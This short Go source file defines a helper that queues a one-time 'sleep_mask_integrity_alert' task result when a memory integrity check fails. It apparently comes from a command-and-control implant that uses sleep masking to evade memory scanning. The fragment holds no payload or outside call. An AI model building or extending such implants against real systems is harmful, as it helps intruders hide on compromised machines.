//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"sync/atomic"
)

var sleepMaskIntegrityReported int32

func reportSleepMaskIntegrityFailure(maskName string, pageIndex int) {
	if !atomic.CompareAndSwapInt32(&sleepMaskIntegrityReported, 0, 1) {
		return
	}
	output := fmt.Sprintf("memory_integrity_failure: page=%d", pageIndex)
	pendingMu.Lock()
	pendingResults = append(pendingResults, TaskResult{
		Type:   "sleep_mask_integrity_alert",
		Output: output,
		Error:  "Memory integrity check failed",
	})
	pendingMu.Unlock()
	if Debug {
		fmt.Printf("[!] %s\n", output)
	}
}
